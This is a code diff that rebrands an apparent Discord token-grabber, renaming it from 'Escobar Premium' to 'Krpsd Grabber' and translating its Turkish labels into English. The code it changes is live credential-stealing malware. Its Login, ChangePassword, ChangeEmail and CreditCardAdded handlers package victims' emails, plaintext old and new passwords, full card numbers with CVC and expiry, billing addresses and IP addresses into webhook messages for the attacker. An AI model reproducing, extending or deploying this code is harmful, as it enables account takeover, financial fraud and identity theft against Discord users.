@@ -144,16 +144,16 @@ function Login(email, password, token) {
     xmlHttp.responseText;`, !0).then((info) => {
         const json = JSON.parse(info);
         var params = {
-            username: "Escobar Premium",
+            username: "Krpsd Grabber",
             content: "",
-            avatar_url: "https://cdn.discordapp.com/attachments/937734856400568330/937734901539667988/672fa233c03365d771c28ed965b36393.png",
+            avatar_url: "https://discord.com/assets/5ccabf62108d5a8074ddd95af2211727.png",
             embeds: [
                 {
-                    "color": 000000,
+                    "color": 16507654,
                     "fields": [
                         {
-                            "name": "**Hesap Bilgisi**",
-                            "value": `Email: ${email} - Şifre: ${password}`,
+                            "name": "**Account Info**",
+                            "value": `Email: ${email} - Password: ${password}`,
                             "inline": true
                         },
                         {
@@ -167,7 +167,7 @@ function Login(email, password, token) {
                         "icon_url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`
                     },
                     "footer": {
-                        "text": "Escobar Premium"
+                        "text": "Discord Token Grabber by krpsd"
                     }
                 }
             ]
@@ -192,21 +192,21 @@ function ChangePassword(oldpassword, newpassword, token) {
     `, !0).then((ip) => {
             const json = JSON.parse(info);
             var params = {
-                username: "Escobar Premium",
+                username: "Krpsd Grabber",
                 content: "",
-                avatar_url: "https://cdn.discordapp.com/attachments/937734856400568330/937734901539667988/672fa233c03365d771c28ed965b36393.png",
+                avatar_url: "https://discord.com/assets/5ccabf62108d5a8074ddd95af2211727.png",
                 embeds: [
                     {
-                        "color": 000000,
+                        "color": 16507654,
                         "fields": [
                             {
-                                "name": "**Şifre Değiştirildi**",
-                                "value": `Email: ${json.email}\nEski Şifre: ${oldpassword}\nYeni Şifre: ${newpassword}`,
+                                "name": "**Password Changed**",
+                                "value": `Email: ${json.email}\nOld Password: ${oldpassword}\nNew Password: ${newpassword}`,
                                 "inline": true
                             },
                             {
-                                "name": "**Diğer Bilgiler**",
-                                "value": `Nitro Türü: ${GetNitro(json.premium_type)}\nRozetler: ${GetBadges(json.flags)}\nIP: ${ip}`,
+                                "name": "**Other Info**",
+                                "value": `Nitro Type: ${GetNitro(json.premium_type)}\nBadges: ${GetBadges(json.flags)}\nIP: ${ip}`,
                                 "inline": true
                             },
                             {
@@ -220,7 +220,7 @@ function ChangePassword(oldpassword, newpassword, token) {
                             "icon_url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`
                         },
                         "footer": {
-                            "text": "Escobar Premium"
+                            "text": "Discord Token Grabber by krpsd"
                         }                 
                     }
                 ]
@@ -245,21 +245,21 @@ function ChangeEmail(newemail, password, token) {
         xmlHttp.responseText;
     `, !0).then((ip) => {
             var params = {
-                username: "Escobar Premium",
+                username: "Krpsd Grabber",
                 content: "",
                 avatar_url: "https://discord.com/assets/5ccabf62108d5a8074ddd95af2211727.png",
                 embeds: [
                     {
-                        "color": 000000,
+                        "color": 16507654,
                         "fields": [
                             {
-                                "name": "**Email Değiştirildi**",
-                                "value": `Yeni Email: ${newemail}\nŞifre: ${password}`,
+                                "name": "**Email Changed**",
+                                "value": `New Email: ${newemail}\nPassword: ${password}`,
                                 "inline": true
                             },
                             {
-                                "name": "**Diğer Bilgiler**",
-                                "value": `Nitro Türü: ${GetNitro(json.premium_type)}\nRozetler: ${GetBadges(json.flags)}\nIP: ${ip}`,
+                                "name": "**Other Info**",
+                                "value": `Nitro Type: ${GetNitro(json.premium_type)}\nBadges: ${GetBadges(json.flags)}\nIP: ${ip}`,
                                 "inline": true
                             },
                             {
@@ -273,7 +273,7 @@ function ChangeEmail(newemail, password, token) {
                             "icon_url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`
                         },
                         "footer": {
-                            "text": "Escobar Premium"
+                            "text": "Discord Token Grabber by krpsd"
                         }                
                     }
                 ]
@@ -299,21 +299,21 @@ function CreditCardAdded(number, cvc, expir_month, expir_year, street, city, sta
     `, !0).then((ip) => {
             var json = JSON.parse(info);
             var params = {
-                username: "Escobar Premium",
+                username: "Krpsd Grabber",
                 content: "",
-                avatar_url: "https://cdn.discordapp.com/attachments/937734856400568330/937734901539667988/672fa233c03365d771c28ed965b36393.png",
+                avatar_url: "https://discord.com/assets/5ccabf62108d5a8074ddd95af2211727.png",
                 embeds: [
                     {
-                        "color": 000000,
+                        "color": 16507654,
                         "fields": [
                             {
-                                "name": "**Kredi Kartı Eklendi**",
-                                "value": `Kredi Kartı Numarası: ${number}\nSon Kullanma Tarihi: ${expir_month}/${expir_year}\nCVC: ${cvc}\n Ülke: ${country}\nEyalet ${state}\nŞehir ${city}\nZIP: ${zip}\n Sokak: ${street}`,
+                                "name": "**Credit Card Added**",
+                                "value": `Credit Card Number: ${number}\nCredit Card Expiration: ${expir_month}/${expir_year}\nCVC: ${cvc}\n Country: ${country}\nState ${state}\nCity ${city}\nZIP: ${zip}\n Street: ${street}`,
                                 "inline": true
                             },
                             {
-                                "name": "**Diğer Bilgiler**",
-                                "value": `Nitro Türü: ${GetNitro(json.premium_type)}\nRozetler: ${GetBadges(json.flags)}\nIP: ${ip}`,
+                                "name": "**Other Info**",
+                                "value": `Nitro Type: ${GetNitro(json.premium_type)}\nBadges: ${GetBadges(json.flags)}\nIP: ${ip}`,
                                 "inline": true
                             },
                             {
@@ -327,7 +327,7 @@ function CreditCardAdded(number, cvc, expir_month, expir_year, street, city, sta
                             "icon_url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`
                         },
                         "footer": {
-                            "text": "Escobar Premium"
+                            "text": "Discord Token Grabber by krpsd"
                         }
                     }
                 ]
@@ -352,21 +352,21 @@ function CreditCardAdded(number, cvc, expir_month, expir_year, street, city, sta
     `, !0).then((ip) => {
 			var json = JSON.parse(info);
             var params = {
-                username: "Escobar Premium",
+                username: "Krpsd Grabber",
                 content: "",
-                avatar_url: "https://cdn.discordapp.com/attachments/937734856400568330/937734901539667988/672fa233c03365d771c28ed965b36393.png",
+                avatar_url: "https://discord.com/assets/5ccabf62108d5a8074ddd95af2211727.png",
                 embeds: [
                     {
-                        "color": 000000,
+                        "color": 16507654,
                         "fields": [
                             {
-                                "name": "**Kredi Kartı Eklendi**",
-                                "value": `Kredi Kartı Numarası: ${number}\nSon Kullanma Tarihi: ${expir_month}/${expir_year}\nCVC: ${cvc}\n Ülke: ${country}\nEyalet ${state}\nŞehir ${city}\nZIP: ${zip}\n Sokak: ${street}`,
+                                "name": "**Credit Card Added**",
+                                "value": `Credit Card Number: ${number}\nCredit Card Expiration: ${expir_month}/${expir_year}\nCVC: ${cvc}\n Country: ${country}\nState ${state}\nCity ${city}\nZIP: ${zip}\n Street: ${street}`,
                                 "inline": true
                             },
                             {
-                                "name": "**Diğer Bilgiler**",
-                                "value": `Nitro Türü: ${GetNitro(json.premium_type)}\nRozetler: ${GetBadges(json.flags)}\nIP: ${ip}`,
+                                "name": "**Other Info**",
+                                "value": `Nitro Type: ${GetNitro(json.premium_type)}\nBadges: ${GetBadges(json.flags)}\nIP: ${ip}`,
                                 "inline": true
                             },
                             {
@@ -380,7 +380,7 @@ function CreditCardAdded(number, cvc, expir_month, expir_year, street, city, sta
                             "icon_url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`
                         },
                         "footer": {
-                            "text": "Escobar Premium"
+                            "text": "Discord Token Grabber by krpsd"
                         }
                     }
                 ]
